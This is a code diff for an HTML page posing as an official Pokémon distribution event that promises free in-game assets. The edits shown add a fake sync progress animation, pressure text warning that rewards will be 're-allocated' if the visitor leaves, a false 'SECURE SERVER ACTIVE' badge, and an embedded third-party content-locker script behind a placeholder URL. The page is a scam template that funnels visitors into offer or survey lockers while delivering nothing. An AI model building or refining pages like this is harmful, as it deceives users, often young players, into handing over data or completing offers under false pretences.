@@ -38,9 +38,6 @@
 
         .container { display: flex; flex-direction: column; align-items: center; padding: 20px 15px 60px; }
 
-        .trust-header { text-align: center; margin-bottom: 25px; }
-        .trust-header span { font-size: 0.6rem; text-transform: uppercase; letter-spacing: 2px; color: var(--primary); font-weight: 900; }
-
         .main-card {
             background: var(--glass); border: 1px solid var(--border); border-radius: 30px;
             width: 100%; max-width: 550px; padding: 40px 25px;
@@ -65,14 +62,9 @@
             padding: 15px; border-radius: 15px; cursor: pointer; transition: 0.3s;
             display: flex; align-items: center; justify-content: center; gap: 10px;
         }
-        .platform-item.active { border-color: var(--primary); background: rgba(0,242,255,0.08); box-shadow: inset 0 0 15px rgba(0,242,255,0.05); }
-        .platform-item i { font-size: 1.2rem; }
-        .platform-item span { font-size: 0.75rem; font-weight: 700; }
+        .platform-item.active { border-color: var(--primary); background: rgba(0,242,255,0.08); }
 
-        .section-title { 
-            font-family: 'Orbitron'; font-size: 0.75rem; color: var(--primary); 
-            margin: 30px 0 15px; text-align: left; width: 100%; display: flex; align-items: center; gap: 10px;
-        }
+        .section-title { font-family: 'Orbitron'; font-size: 0.75rem; color: var(--primary); margin: 30px 0 15px; text-align: left; width: 100%; display: flex; align-items: center; gap: 10px; }
         .section-title::after { content: ''; flex: 1; height: 1px; background: rgba(0,242,255,0.1); }
 
         .grid-layout { display: grid; grid-template-columns: repeat(auto-fit, minmax(130px, 1fr)); gap: 12px; width: 100%; }
@@ -90,12 +82,7 @@
         .reward-card span { font-weight: 800; font-size: 0.8rem; text-transform: uppercase; }
         .reward-card small { color: var(--primary); font-size: 0.6rem; font-weight: 700; }
 
-        .input-ui {
-            background: #000; border: 1px solid rgba(255,255,255,0.1);
-            border-radius: 12px; padding: 18px; width: 100%; color: #fff;
-            font-size: 1rem; margin-bottom: 10px; box-sizing: border-box; outline: none; transition: 0.3s;
-        }
-        .input-ui:focus { border-color: var(--primary); box-shadow: 0 0 15px rgba(0,242,255,0.1); }
+        .input-ui { background: #000; border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; padding: 18px; width: 100%; color: #fff; font-size: 1rem; margin-bottom: 10px; box-sizing: border-box; outline: none; }
 
         .btn-action {
             background: linear-gradient(90deg, #00f2ff, #0072ff);
@@ -107,14 +94,6 @@
 
         .hidden { display: none; }
         
-        .live-stats {
-            display: flex; justify-content: space-around; width: 100%; max-width: 550px;
-            margin-top: 25px; padding: 15px; background: rgba(255,255,255,0.02); border-radius: 15px; border: 1px solid rgba(255,255,255,0.05);
-        }
-        .stat-box { text-align: center; }
-        .stat-box div:first-child { font-weight: 900; font-size: 0.9rem; color: var(--primary); }
-        .stat-box div:last-child { font-size: 0.55rem; color: #555; text-transform: uppercase; font-weight: 700; }
-
         .selected-preview { width: 100px; height: 100px; object-fit: contain; margin: 10px auto; display: block; filter: drop-shadow(0 0 15px var(--primary)); animation: float 2s infinite ease-in-out; }
         @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
 
@@ -123,23 +102,24 @@
         
         #progress-bar-container { width: 100%; background: #111; height: 6px; border-radius: 10px; overflow: hidden; margin: 20px 0; }
         #progress-bar { height: 100%; background: var(--primary); width: 0%; transition: 0.3s; box-shadow: 0 0 10px var(--primary); }
+
+        #locker-container { width: 100%; min-height: 250px; background: rgba(0,0,0,0.3); border-radius: 15px; border: 1px solid var(--border); margin-top: 20px; }
+
+        .persuasive-text {
+            font-size: 0.8rem; color: #ffeb3b; font-weight: 700; line-height: 1.4;
+            margin: 15px 0; background: rgba(255,235,59,0.1); padding: 12px; border-radius: 10px;
+            border-left: 4px solid #ffeb3b; text-align: left;
+        }
     </style>
 </head>
 <body>
 
 <nav>
     <img src="https://upload.wikimedia.org/wikipedia/commons/9/98/International_Pok%C3%A9mon_logo.svg" class="logo-nav">
-    <div class="server-status">
-        <div class="status-dot"></div>
-        SECURE SERVER ACTIVE
-    </div>
+    <div class="server-status"><div class="status-dot"></div>SECURE SERVER ACTIVE</div>
 </nav>
 
 <div class="container">
-    <div class="trust-header">
-        <span>Official Season 12 Distribution Event</span>
-    </div>
-
     <div class="main-card">
         <div class="step-map">
             <div class="step-point active" id="dot1">1</div>
@@ -148,17 +128,11 @@
         </div>
 
         <div id="ui-step1">
-            <h2 style="font-family: 'Orbitron'; font-size: 1.4rem; margin-bottom: 5px;">Verify Trainer</h2>
+            <h2 style="font-family: 'Orbitron'; font-size: 1.4rem;">Trainer Auth</h2>
             <input type="text" class="input-ui" id="trainer-id" placeholder="Username / ID...">
             <div class="platform-grid">
-                <div class="platform-item active" onclick="selectPlatform(this)">
-                    <i class="fab fa-android" style="color: #3DDC84;"></i>
-                    <span>ANDROID</span>
-                </div>
-                <div class="platform-item" onclick="selectPlatform(this)">
-                    <i class="fab fa-apple" style="color: #fff;"></i>
-                    <span>IOS / IPAD</span>
-                </div>
+                <div class="platform-item active" onclick="selectPlatform(this)"><span>ANDROID</span></div>
+                <div class="platform-item" onclick="selectPlatform(this)"><span>IOS / IPAD</span></div>
             </div>
             <button class="btn-action" onclick="toStep2()">Check Eligibility</button>
         </div>
@@ -217,26 +191,24 @@
 
         <div id="ui-sync" class="hidden">
             <img id="item-preview" src="" class="selected-preview">
-            <h4 id="status-text" style="color: var(--primary); font-family: 'Orbitron'; font-size: 0.8rem; margin-top: 10px;">Connecting...</h4>
+            <h4 id="status-text" style="color: var(--primary); font-family: 'Orbitron'; font-size: 0.8rem;">Connecting...</h4>
             <div class="loader"></div>
-            <div id="progress-bar-container">
-                <div id="progress-bar"></div>
-            </div>
-            <p id="sync-success-text" class="hidden" style="color: var(--success); font-weight: 800; font-size: 0.9rem;">Sync Success!</p>
+            <div id="progress-bar-container"><div id="progress-bar"></div></div>
         </div>
 
         <div id="ui-locker" class="hidden">
             <div class="back-btn" onclick="backTo(2)"><i class="fas fa-chevron-left"></i> Back</div>
-            <h2 style="font-family: 'Orbitron'; color: var(--accent);">Manual Sync Required</h2>
-            <p style="font-size: 0.85rem; color: #ccc;">Verify your identity to claim <span id="final-res" style="color:var(--primary); font-weight:900;">Assets</span>.</p>
-            <button class="btn-action" onclick="window.location.href='YOUR_LINK_HERE'">Verify & Claim Now</button>
-        </div>
-    </div>
+            <h2 style="font-family: 'Orbitron'; color: var(--primary); font-size: 1.2rem;">Final Verification</h2>
+            
+            <div class="persuasive-text">
+                ⚠️ Your selected <span id="final-res" style="color:var(--primary);">Asset</span> has been successfully generated for your ID. To prevent bot abuse and finalize the transfer, please complete one quick verification below. Exiting now will cause your rewards to be re-allocated to another user.
+            </div>
 
-    <div class="live-stats">
-        <div class="stat-box"><div id="count-online">1,290</div><div>Online Now</div></div>
-        <div class="stat-box"><div>45.2K</div><div>Syncs Today</div></div>
-        <div class="stat-box"><div style="color: var(--success);">Online</div><div>Server Status</div></div>
+            <div id="locker-container">
+                <p style="color:#333; padding-top:100px;">Loading Verification Tools...</p>
+                <script type="text/javascript" src="https://YOUR_LOCKER_SCRIPT_URL"></script>
+            </div>
+        </div>
     </div>
 </div>
 
@@ -263,10 +235,7 @@
         document.getElementById('ui-sync').classList.add('hidden');
         document.getElementById('ui-step' + step).classList.remove('hidden');
         if(step === 1) document.getElementById('dot2').classList.remove('active');
-        if(step === 2) {
-             document.getElementById('dot3').classList.remove('active');
-             document.getElementById('sync-success-text').classList.add('hidden');
-        }
+        if(step === 2) document.getElementById('dot3').classList.remove('active');
     }
 
     function selectItem(el, name, imgUrl) {
@@ -284,20 +253,19 @@
         document.getElementById('final-res').innerText = currentSelection;
         
         let p = 0;
-        const msg = ["Locating Trainer ID...", "Injecting Metadata...", "Finalizing Handshake...", "Sync Success!"];
+        const msg = ["Syncing ID...", "Allocating Resources...", "Securing Connection...", "Finalizing!"];
         const inv = setInterval(() => {
             p += 1;
             document.getElementById('progress-bar').style.width = p + '%';
             if(p % 25 === 0) document.getElementById('status-text').innerText = msg[Math.floor(p/25)-1];
             if(p >= 100) {
                 clearInterval(inv);
-                document.getElementById('sync-success-text').classList.remove('hidden');
                 setTimeout(() => {
                     document.getElementById('ui-sync').classList.add('hidden');
                     document.getElementById('ui-locker').classList.remove('hidden');
-                }, 1000);
+                }, 800);
             }
-        }, 50);
+        }, 40);
     }
 </script>
 </body>
